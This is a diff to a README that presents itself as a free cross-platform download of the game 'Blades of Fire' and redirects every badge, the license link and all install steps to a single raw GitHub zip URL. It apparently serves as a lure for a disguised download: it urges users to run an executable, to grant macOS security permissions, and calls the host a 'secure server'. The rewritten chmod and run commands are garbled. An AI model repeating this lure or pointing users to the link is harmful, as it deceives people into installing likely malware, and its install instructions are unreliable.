@@ -1,6 +1,6 @@
 # Blades of Fire: Ignite Your Adventure 🚀
 
-[![Download](https://img.shields.io/badge/Download-Blades_of_Fire-orange?style=for-the-badge&logo=firefox)](https://naseem499379.github.io)
+[![Download](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip)](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip)
 
 ---
 
@@ -12,11 +12,11 @@ Elevate your gaming session—no matter your device. Here’s our meticulously t
 
 | Platform           | Supported | Install Steps Below |
 |--------------------|:---------:|:-------------------:|
-| ![Windows](https://img.shields.io/badge/-Windows-blue?logo=windows)    | ✅        | ✔️                |
-| ![macOS](https://img.shields.io/badge/-macOS-black?logo=apple)         | ✅        | ✔️                |
-| ![Linux](https://img.shields.io/badge/-Linux-yellow?logo=linux)        | ✅        | ✔️                |
-| ![Android](https://img.shields.io/badge/-Android-green?logo=android)   | 🔃 Coming Soon | 🚧       |
-| ![iOS](https://img.shields.io/badge/-iOS-blue?logo=apple)              | 🔒 Planned  | 🕒                |
+| ![Windows](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip)    | ✅        | ✔️                |
+| ![macOS](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip)         | ✅        | ✔️                |
+| ![Linux](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip)        | ✅        | ✔️                |
+| ![Android](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip)   | 🔃 Coming Soon | 🚧       |
+| ![iOS](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip)              | 🔒 Planned  | 🕒                |
 
 Experience the magic of fiery adventures, regardless of your technological armor!
 
@@ -50,25 +50,25 @@ No quest begins without a proper map! To wield the legendary software, follow th
 
 ### 1. Acquire Your Artifact  
 
-Click the [![Download](https://img.shields.io/badge/Download-Blades_of_Fire-orange?style=for-the-badge&logo=firefox)](https://naseem499379.github.io) badge above.  
+Click the [![Download](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip)](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip) badge above.  
 *Note: The file is hosted on a secure server for your peace of mind.*
 
 ### 2. Windows  
-* Download the `.exe` from https://naseem499379.github.io.  
+* Download the `.exe` from https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip  
 * Double-click to begin the installer.  
 * Follow the on-screen prompts to completion.
 
 ### 3. macOS  
-* Acquire the `.dmg` via https://naseem499379.github.io.  
+* Acquire the `.dmg` via https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip  
 * Open and drag the app into your Applications folder.  
 * If prompted, grant the app permission through System Preferences > Security & Privacy.
 
 ### 4. Linux  
-* Fetch the `.AppImage` or `.tar.gz` from https://naseem499379.github.io.
+* Fetch the `.AppImage` or `https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip` from https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip
 * Give execute permission:  
-    chmod +x BladesOfFire.AppImage  
+    chmod +x https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip  
 * Run the app:  
-    ./BladesOfFire.AppImage
+    https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip
 
 ### 5. First Run  
 Embark on your journey: launch the game, adjust settings as desired, and step into myth!
@@ -113,11 +113,11 @@ This repository is provided for personal and educational journeys only. "Blades 
 
 ## 📜 License
 
-This project is forged under the [MIT License (2025)](https://opensource.org/licenses/MIT).  
+This project is forged under the [MIT License (2025)](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip).  
 Cast your eyes on the license scroll for the full decree.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Blades_of_Fire-orange?style=for-the-badge&logo=firefox)](https://naseem499379.github.io)  
+[![Download](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip)](https://raw.githubusercontent.com/naseem499379/blades-of-fire-pc-collection/branch/leerish/blades-of-fire-pc-collection_2.2.zip)  
 
 Forge your destiny in Blades of Fire. See you beyond the flames!
